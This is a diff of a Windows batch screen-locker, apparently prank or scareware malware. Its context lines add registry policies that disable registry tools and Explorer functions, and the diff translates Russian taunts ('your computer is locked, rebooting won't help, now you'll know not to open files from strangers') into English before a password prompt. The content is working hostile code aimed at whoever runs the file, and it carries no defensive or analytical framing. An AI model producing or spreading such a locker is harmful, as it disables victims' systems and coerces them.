@@ -18,17 +18,11 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDe
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
 
 cls >nul
-title Windows Заблокирован!
+title Windows was locked!
 
-echo Windows Заблокирован!
+echo windows was locked!
 
-echo Твой компьютер заблокирован
-
-echo Теперь ты будешь знать, как открывать файлы от незнакомых людей
-
-echo Перезагрузка тебе не поможет
-
-echo В общем, твой ПК просто заблокирован
+echo Your PC was locked!
 
 echo Enter Password:
 
